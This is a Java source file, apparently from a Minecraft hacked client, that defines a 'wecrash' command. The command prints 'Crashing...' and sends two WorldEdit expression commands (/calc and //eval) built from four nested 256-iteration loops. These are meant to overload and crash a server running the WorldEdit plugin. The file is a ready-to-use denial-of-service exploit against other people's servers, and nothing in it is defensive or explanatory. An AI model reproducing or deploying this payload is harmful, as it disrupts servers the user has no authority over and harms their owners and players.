package me.deepcraft.commands.list;

import me.deepcraft.commands.Command;
import me.deepcraft.utils.ChatUtil;
import net.minecraft.client.Minecraft;

public class WECrashCommand extends Command {

    public WECrashCommand() {
        super("wecrash");
    }

    @Override
    public void execute(String[] args) {
        ChatUtil.clientMessage("§aCrashing...");
        ChatUtil.publicMessage("/worldedit:/calc for(i=0;i<256;i++){for(b=0;b<256;b++){for(h=0;h<256;h++){for(n=0;n<256;n++){}}}}");
        ChatUtil.publicMessage("//eval for(i=0;i<256;i++){for(b=0;b<256;b++){for(h=0;h<256;h++){for(n=0;n<256;n++){sin(n)}}}}");
    }
}
